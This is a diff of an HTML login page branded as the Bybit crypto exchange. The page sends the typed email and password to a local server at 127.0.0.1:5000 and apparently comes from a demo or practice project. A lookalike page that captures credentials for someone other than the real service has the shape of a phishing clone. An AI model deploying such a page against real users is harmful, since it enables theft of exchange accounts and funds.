@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bybit Login Page</title>
@@ -44,48 +43,58 @@
         button:hover {
             background-color: #cc3700;
         }
+        #result {
+            color: #ff6666;
+            font-size: 14px;
+            text-align: center;
+        }
+        p.forgot-password {
+            text-align: left;
+            color: #aaa;
+            cursor: pointer;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
     <div class="login-container">
         <h1>Bybit Login</h1>
-        <form onsubmit="return false;">
+        <form id="loginForm" onsubmit="return false;">
             <input type="text" id="email" placeholder="Email" required>
             <input type="password" id="password" placeholder="Password" required>
-            <p>Forgot Password</p>
+            <p class="forgot-password" onclick="alert('Forgot Password clicked')">Forgot Password</p>
             <button type="submit">Login Now</button>
         </form>
-        
+        <div id="result"></div> <!-- Display login result here -->
     </div>
 
+    <script>
+        const form = document.getElementById('loginForm');
+        const result = document.getElementById('result');
 
-  <script>
-    const form = document.getElementById('loginForm');
-    const result = document.getElementById('result');
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault();
 
-    form.addEventListener('submit', async (event) => {
-      event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+            try {
+                const response = await fetch('http://127.0.0.1:5000/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
 
-      try {
-        const response = await fetch('http://127.0.0.1:5000/login', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ email, password })
+                const data = await response.json();
+                result.textContent = data.message; // Show the response message
+
+            } catch (error) {
+                result.textContent = 'Error connecting to server.';
+            }
         });
-
-        const data = await response.json();
-        result.textContent = data.message;
-
-      } catch (error) {
-        result.textContent = 'Error connecting to server.';
-      }
-    });
-  </script>
-    </body>
+    </script>
+</body>
 </html>
 
